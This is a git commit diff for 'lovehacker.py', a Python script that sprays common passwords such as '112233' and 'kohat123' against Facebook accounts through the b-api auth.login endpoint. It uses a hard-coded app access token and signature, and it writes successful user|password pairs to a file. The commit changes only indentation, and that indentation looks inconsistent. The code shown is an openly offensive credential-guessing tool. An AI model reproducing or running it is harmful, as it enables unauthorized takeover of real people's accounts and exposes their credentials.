fc51a75140858c77221cb75365e8c4f13e1897aa
adilffm <56082276+adilffm@users.noreply.github.com>
2020-05-13 08:36:18 +0500

    lovehacker.py

--- lovehacker.py
+++ lovehacker.py
@@ -496,7 +496,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-    								pass7 = '112233'
+    			                                                                pass7 = '112233'        
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -509,8 +509,8 @@ def pilih_super():
 													cek.write(user+"|"+pass7+"\n")
 													cek.close()
 													cekpoint.append(user+pass7)
-												else:
-    								pass8 = 'kohat123'
+											else:
+    								                    pass8 = 'kohat123'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -523,8 +523,8 @@ def pilih_super():
 													cek.write(user+"|"+pass8+"\n")
 													cek.close()
 													cekpoint.append(user+pass8)
-												else:
-    								pass9 = '9696296'
+											else:
+    								                        pass9 = '9696296'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
